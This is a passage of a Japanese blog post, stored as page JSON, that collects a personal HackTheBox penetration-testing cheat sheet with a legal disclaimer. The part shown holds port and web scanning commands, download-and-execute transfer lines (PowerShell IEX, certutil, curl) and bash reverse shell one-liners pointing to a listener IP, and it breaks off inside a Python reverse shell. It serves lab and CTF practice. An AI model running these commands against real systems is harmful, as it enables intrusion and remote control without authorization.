{"componentChunkName":"component---src-templates-post-template-js","path":"/cheatsheet-main","result":{"data":{"markdownRemark":{"id":"939364ad-f998-589d-8df8-88fa20666211","html":"<p>個人的に使用しているHackTheBox用のチートシートをまとめました。</p>\n<p><strong>本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。</strong></p>\n<p>自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。</p>\n<p>またすべての発言は所属団体ではなく個人に帰属します。</p>\n<!-- omit in toc -->\n<h2 id=\"もくじ\" style=\"position:relative;\"><a href=\"#%E3%82%82%E3%81%8F%E3%81%98\" aria-label=\"もくじ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>もくじ</h2>\n<ul>\n<li>\n<p><a href=\"#%E4%BD%BF%E7%94%A8%E9%A0%BB%E5%BA%A6%E3%81%AE%E9%AB%98%E3%81%84%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%BE%E3%81%A8%E3%82%81\">使用頻度の高いコマンドまとめ</a></p>\n<ul>\n<li><a href=\"#%E6%94%BB%E7%95%A5%E9%96%8B%E5%A7%8B%E6%99%82%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">攻略開始時(ポートスキャン)</a></li>\n<li><a href=\"#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\">ネットワーク探索のポイント</a></li>\n<li><a href=\"#web%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">Webスキャン</a></li>\n<li><a href=\"#ftp%E6%8E%A5%E7%B6%9A\">FTP接続</a></li>\n<li><a href=\"#%E6%94%BB%E6%92%83%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%BB%A2%E9%80%81\">攻撃ファイル転送</a></li>\n<li><a href=\"#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB\">リバースシェル</a></li>\n<li><a href=\"#%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AE%E7%94%9F%E6%88%90\">ペイロードの生成</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%84%E3%83%BC%E3%83%AB%E3%81%BE%E3%81%A8%E3%82%81\">スキャンツールまとめ</a></p>\n<ul>\n<li><a href=\"#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">ポートスキャン</a></li>\n<li><a href=\"#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">データベースのスキャン</a></li>\n<li><a href=\"#windowssamba%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">Windows/Sambaシステムのスキャン</a></li>\n<li><a href=\"#active-directory%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">Active Directory環境のスキャン</a></li>\n<li><a href=\"#web%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\">Web脆弱性スキャン</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#web%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%BE%E3%81%A8%E3%82%81\">Webエクスプロイトまとめ</a></p>\n<ul>\n<li><a href=\"#web-shell%E3%82%92%E4%BD%BF%E3%81%86\">Web Shellを使う</a></li>\n<li><a href=\"#sql-injection\">SQL injection</a></li>\n<li><a href=\"#xss\">XSS</a></li>\n<li><a href=\"#xml-external-entityxml%E5%A4%96%E9%83%A8%E5%AE%9F%E4%BD%93%E5%8F%82%E7%85%A7\">XML External Entity(XML外部実体参照)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E3%81%9D%E3%81%AE%E4%BB%96%E3%81%AE%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88\">その他のエクスプロイト</a></p>\n<ul>\n<li><a href=\"#smbactive-directory%E3%82%92%E6%82%AA%E7%94%A8%E3%81%97%E3%81%9F%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9\">SMB、Active Directoryを悪用したリモートアクセス</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2windows\">内部探索(Windows)</a></p>\n<ul>\n<li><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\">内部探索のポイント</a></li>\n<li><a href=\"#%E7%AB%AF%E6%9C%AB%E6%83%85%E5%A0%B1%E3%81%AE%E5%8F%96%E5%BE%97\">端末情報の取得</a></li>\n<li><a href=\"#windows%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%AE%E7%89%B9%E5%AE%9A\">Windowsエクスプロイトの特定</a></li>\n<li><a href=\"#windows%E3%83%A6%E3%83%BC%E3%82%B6%E6%83%85%E5%A0%B1%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E7%89%B9%E6%A8%A9%E3%81%AE%E6%8E%A2%E7%B4%A2\">Windowsユーザ情報、セキュリティ特権の探索</a></li>\n<li><a href=\"#uac%E3%81%AE%E5%A4%89%E6%9B%B4\">UACの変更</a></li>\n<li><a href=\"#%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E5%85%B1%E6%9C%89%E3%83%95%E3%82%A9%E3%83%AB%E3%83%80%E3%81%AE%E6%A8%A9%E9%99%90%E3%81%AE%E6%8E%A2%E7%B4%A2\">フォルダ、共有フォルダの権限の探索</a></li>\n<li><a href=\"#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%81%AE%E7%A2%BA%E8%AA%8D\">環境変数の確認</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97windows\">特権取得(Windows)</a></p>\n<ul>\n<li><a href=\"#mimikatz%E3%81%A7kerberos%E7%92%B0%E5%A2%83%E3%82%92%E6%94%BB%E6%92%83%E3%81%99%E3%82%8B\">mimikatzでKerberos環境を攻撃する</a></li>\n<li><a href=\"#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%89%B9%E6%A8%A9%E6%98%87%E6%A0%BC%E3%83%84%E3%83%BC%E3%83%AB\">ローカル特権昇格ツール</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%E5%86%85%E9%83%A8%E6%8E%A2%E7%B4%A2linux\">内部探索(Linux)</a></p>\n<ul>\n<li><a href=\"#%E4%BE%BF%E5%88%A9%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\">便利コマンド</a></li>\n<li><a href=\"#linpeas%E3%81%AEtips\">linpeasのTips</a></li>\n<li><a href=\"#%E7%AB%AF%E6%9C%AB%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%8E%A2%E7%B4%A2\">端末のディレクトリ探索</a></li>\n</ul>\n</li>\n<li><a href=\"#%E7%89%B9%E6%A8%A9%E5%8F%96%E5%BE%97linux\">特権取得(Linux)</a></li>\n<li>\n<p><a href=\"#%E3%83%91%E3%82%B9%E3%83%AF%E3%83%BC%E3%83%89%E3%81%AE%E8%A7%A3%E8%AA%AD\">パスワードの解読</a></p>\n<ul>\n<li><a href=\"#hashcat%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\">Hashcatサンプル</a></li>\n<li><a href=\"#hashcat-%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3tips\">Hashcat オプションTips</a></li>\n<li><a href=\"#keepass-database\">KeePass database</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#pwn%E3%81%AEtips\">pwnのTips</a></p>\n<ul>\n<li><a href=\"#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E9%80%81%E3%82%8A%E8%BE%BC%E3%82%80\">プロセスにバイトコードを送り込む</a></li>\n<li><a href=\"#return-to-pltreturn-to-libc\">Return to PLT/Return to libc</a></li>\n<li><a href=\"#%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E6%94%BB%E6%92%83%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\">書式文字攻撃サンプル</a></li>\n<li><a href=\"#rop%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\">ROPサンプル</a></li>\n<li><a href=\"#got-overwrite%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\">GOT Overwriteサンプル</a></li>\n<li><a href=\"#glib%E3%83%AA%E3%83%B3%E3%82%AB%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E5%95%8F%E9%A1%8C\">glib、リンカのバージョン問題</a></li>\n<li><a href=\"#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%81%A7%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92xinted%E3%81%99%E3%82%8B\">ローカルでバイナリをxintedする</a></li>\n<li><a href=\"#heap-exploit\">Heap Exploit</a></li>\n<li><a href=\"#pwn%E5%8F%82%E8%80%83%E8%A8%98%E4%BA%8B\">Pwn参考記事</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gdb%E3%81%AEtips\">gdbのTips</a></p>\n<ul>\n<li><a href=\"#%E3%83%95%E3%83%A9%E3%82%B0%E7%BD%AE%E3%81%8D%E6%8F%9B%E3%81%88%E6%96%B9%E6%B3%95\">フラグ置き換え方法</a></li>\n<li><a href=\"#%E6%9D%A1%E4%BB%B6%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E5%91%BD%E4%BB%A4%E3%83%A1%E3%83%A2\">条件ジャンプ命令メモ</a></li>\n<li><a href=\"#%E3%83%A1%E3%83%A2%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97%E3%81%AE%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%84%E3%81%A4\">メモリ読み出しのよく使うやつ</a></li>\n<li><a href=\"#%E3%83%AC%E3%82%B8%E3%82%B9%E3%83%88%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97\">レジストリ読み出し</a></li>\n<li><a href=\"#%E5%A4%89%E6%95%B0%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97\">変数読み出し</a></li>\n<li><a href=\"#%E5%AE%9F%E8%A1%8C%E6%99%82%E5%BC%95%E6%95%B0--%E6%A8%99%E6%BA%96%E5%85%A5%E5%87%BA%E5%8A%9B\">実行時引数 / 標準入出力</a></li>\n<li><a href=\"#gdb%E3%82%92python%E3%81%A7%E6%93%8D%E4%BD%9C%E3%81%99%E3%82%8B\">GDBをPythonで操作する</a></li>\n<li><a href=\"#gdb%E3%81%A7%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%82%A2%E3%82%BF%E3%83%83%E3%83%81%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC\">GDBでプロセスにアタッチ(ワンライナー)</a></li>\n<li><a href=\"#peda%E3%81%AE%E6%A9%9F%E8%83%BD%E3%82%92%E4%BD%BF%E3%81%86\">pedaの機能を使う</a></li>\n</ul>\n</li>\n<li><a href=\"#angr%E3%81%AE%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB\">angrのサンプル</a></li>\n</ul>\n<h2 id=\"使用頻度の高いコマンドまとめ\" style=\"position:relative;\"><a href=\"#%E4%BD%BF%E7%94%A8%E9%A0%BB%E5%BA%A6%E3%81%AE%E9%AB%98%E3%81%84%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"使用頻度の高いコマンドまとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>使用頻度の高いコマンドまとめ</h2>\n<h3 id=\"攻略開始時ポートスキャン\" style=\"position:relative;\"><a href=\"#%E6%94%BB%E7%95%A5%E9%96%8B%E5%A7%8B%E6%99%82%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"攻略開始時ポートスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>攻略開始時(ポートスキャン)</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ターゲットマシンのIPをHOSTSに追加して高速スキャン</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">sed</span> -i <span class=\"token string\">'s/^[0-9].*targethost.htb/10.0.0.10  targethost.htb/g'</span> /etc/hosts\nnmap -sV -sC -T4 targethost.htb<span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap1.txt\nrustscan -a targethost.htb --range <span class=\"token number\">1</span>-10000<span class=\"token operator\">|</span> <span class=\"token function\">tee</span> ruststan-fast.txt\n\n<span class=\"token comment\"># All ports</span>\nnmap -p- targethost.htb -Pn -sC -sV -A  <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap_max.txt</code></pre></div>\n<p>参考：<a href=\"https://linux.die.net/man/1/nmap\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">nmap - Linux man page</a></p>\n<p>参考：<a href=\"https://rustscan.github.io/RustScan/#-usage\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">RustScan | Faster Nmap Scanning with Rust</a></p>\n<h3 id=\"ネットワーク探索のポイント\" style=\"position:relative;\"><a href=\"#%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF%E6%8E%A2%E7%B4%A2%E3%81%AE%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88\" aria-label=\"ネットワーク探索のポイント permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ネットワーク探索のポイント</h3>\n<ul>\n<li>Well Knownポートのスキャンだけで対象が見つからない場合は、全ポートのスキャンを試してみる。</li>\n<li>アクセスしているWebページから有益な情報が得られない場合は、ページソースの中に情報漏洩が無いか確認してみる。</li>\n<li>謎のTCPポートが解放されている場合、netcatで接続してみると何か出るかも。</li>\n</ul>\n<h3 id=\"webスキャン\" style=\"position:relative;\"><a href=\"#web%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"webスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Webスキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># gobuster 特定のディレクトリ配下をさらに調べたいときは階層を追加する</span>\ngobuster <span class=\"token function\">dir</span> -u http://targethost.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t <span class=\"token number\">40</span> <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> gobuster.txt\n\n<span class=\"token comment\"># バックエンドの種類に合わせて変更する</span>\nferoxbuster -u http://targethost.htb/ -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> feroxbuster.txt\n\nferoxbuster -u http://targethost.htb/  -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> feroxbuster.txt\n\n<span class=\"token comment\">## --no-recursion</span>\nferoxbuster -u http://targethost.htb/ -x php -w /usr/share/wordlists/raft-medium-directories.txt --no-recursion <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> feroxbuster.txt\n\n<span class=\"token comment\"># WebDAVの探索</span>\n/usr/bin/davtest -url http://targethost.htb/</code></pre></div>\n<h3 id=\"ftp接続\" style=\"position:relative;\"><a href=\"#ftp%E6%8E%A5%E7%B6%9A\" aria-label=\"ftp接続 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>FTP接続</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># Anonymous Login</span>\n$ <span class=\"token function\">ftp</span> targethost.htb\nConnected to targethost.htb.\nName <span class=\"token punctuation\">(</span>targethost.htb:kali<span class=\"token punctuation\">)</span>: anonymous</code></pre></div>\n<h3 id=\"攻撃ファイル転送\" style=\"position:relative;\"><a href=\"#%E6%94%BB%E6%92%83%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E8%BB%A2%E9%80%81\" aria-label=\"攻撃ファイル転送 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>攻撃ファイル転送</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># HTTP/FTPサーバ起動(ホスト側)</span>\n<span class=\"token builtin class-name\">cd</span> ~/Hacking/Tools\npython3 -m http.server <span class=\"token number\">5000</span>\npython3 /home/kali/Hacking/Tools/localftp.py\n\n<span class=\"token comment\"># ファイルダウンロード(HTTP)</span>\n<span class=\"token function\">curl</span> <span class=\"token string\">\"http://10.10.10.7:5000/linpeas.sh\"</span> -o <span class=\"token string\">\"linpeas.sh\"</span>\n<span class=\"token function\">curl</span> <span class=\"token string\">\"http://10.10.10.7:5000/winPEASx64.exe\"</span> -o <span class=\"token string\">\"winPEASx64.exe\"</span>\nInvoke-WebRequest <span class=\"token string\">\"http://10.10.10.7:5000/winPEASx64.exe\"</span> -OutFile <span class=\"token string\">\"winPEASx64.exe\"</span>\nIEX<span class=\"token punctuation\">(</span>New-Object Net.WebClient<span class=\"token punctuation\">)</span>.downloadstring<span class=\"token punctuation\">(</span><span class=\"token string\">'http://10.10.10.7:5000/winPEASx64.bat'</span><span class=\"token punctuation\">)</span>\ncertutil.exe -URLCache -split -f http://10.10.14.3:5000/exploit exploit.exe\n\n<span class=\"token comment\"># ファイルダウンロード(FTP)</span>\n<span class=\"token comment\"># FTPでWindowsマシンにバイナリを転送する場合は、binary modeを使わないと実行できないので注意</span>\n<span class=\"token comment\"># https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token function\">open</span> <span class=\"token number\">10.10</span>.14.3 <span class=\"token operator\">></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> user user password <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> binary <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> get nc.exe nc.exe <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> quit <span class=\"token operator\">>></span> ftp.txt\n<span class=\"token function\">ftp</span> -n <span class=\"token operator\">&lt;</span> ftp.txt\n\n<span class=\"token comment\"># WebDavのPUTが使える場合</span>\n<span class=\"token function\">curl</span> -T test.html http://targethost.htb</code></pre></div>\n<p>よく転送するファイル</p>\n<ul>\n<li><a href=\"https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PEASS-ng/linPEAS at master · carlospolop/PEASS-ng</a></li>\n<li><a href=\"https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PEASS-ng/winPEAS at master · carlospolop/PEASS-ng</a></li>\n<li>\n<p><a href=\"https://github.com/rasta-mouse/Sherlock\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">rasta-mouse/Sherlock: PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.</a></p>\n<ul>\n<li>WinPEASで利用するWatsonによる脆弱性検索はWindowsServer 2016以降でしか動作しないためSherlockを使う場合がある</li>\n</ul>\n</li>\n<li><a href=\"https://github.com/SecWiki/windows-kernel-exploits\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SecWiki/windows-kernel-exploits: その他エクスプロイト</a></li>\n<li><a href=\"https://github.com/AonCyberLabs/Windows-Exploit-Suggester\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">AonCyberLabs/Windows-Exploit-Suggester</a></li>\n<li><a href=\"https://www.kali.org/tools/windows-binaries/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">windows-binaries | Kali Linux Tools</a></li>\n<li><a href=\"https://github.com/ohpe/juicy-potato\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ohpe/juicy-potato</a></li>\n<li><a href=\"https://github.com/Re4son/Churrasco\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Re4son/Churrasco</a></li>\n<li><a href=\"https://github.com/ParrotSec/mimikatz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ParrotSec/mimikatz</a></li>\n</ul>\n<h3 id=\"リバースシェル\" style=\"position:relative;\"><a href=\"#%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB\" aria-label=\"リバースシェル permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>リバースシェル</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># ホスト待ち受け</span>\n<span class=\"token function\">nc</span> -nlvp <span class=\"token number\">4444</span>\n<span class=\"token function\">sudo</span> tcpdump -i tun0 icmp\n\n<span class=\"token comment\"># spawn</span>\npython3 -c <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span>\n\n<span class=\"token comment\"># よく使うrevshell</span>\n<span class=\"token comment\"># Bash</span>\n<span class=\"token function\">bash</span> -i <span class=\"token operator\">>&amp;</span> /dev/tcp/10.10.10.1/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span>\n<span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&lt;&amp;</span><span class=\"token number\">196</span><span class=\"token punctuation\">;</span><span class=\"token builtin class-name\">exec</span> <span class=\"token number\">19</span><span class=\"token operator\"><span class=\"token file-descriptor important\">6</span>&lt;></span>/dev/tcp/10.10.10.1/4444<span class=\"token punctuation\">;</span> <span class=\"token function\">sh</span> <span class=\"token operator\">&lt;&amp;</span><span class=\"token number\">196</span> <span class=\"token operator\">>&amp;</span><span class=\"token number\">196</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>>&amp;</span><span class=\"token number\">196</span>\n/bin/bash -l <span class=\"token operator\">></span> /dev/tcp/10.10.10.1/4444 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&lt;</span><span class=\"token file-descriptor important\">&amp;1</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span>\n\n<span class=\"token comment\"># 名前付きパイプ</span>\n<span class=\"token function\">mknod</span> pipe p\n./app <span class=\"token operator\">&lt;</span> pipe\n\n<span class=\"token comment\"># Python</span>\npython -c <span class=\"token string\">'import 